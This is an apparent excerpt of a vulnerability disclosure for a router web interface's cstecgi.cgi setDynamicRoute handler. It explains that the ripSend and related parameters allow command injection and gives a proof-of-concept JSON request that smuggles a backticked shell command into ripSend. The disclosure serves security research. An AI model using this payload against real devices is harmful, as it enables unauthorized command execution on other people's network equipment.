...
The vulnerability is located in the function `sub_410D64` within `cstecgi.cgi`, also known as `setDynamicRoute`.

![](Pasted%20image%2020231130170446.png)
...
therefore , by controlling parameter among  `enable,nat,ripSend,ripRecv` , we can finally make an arbitrary command execution
...
{"ripSend":"`id > /1.txt;`","topicurl":"setDynamicRoute","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231130170822.png)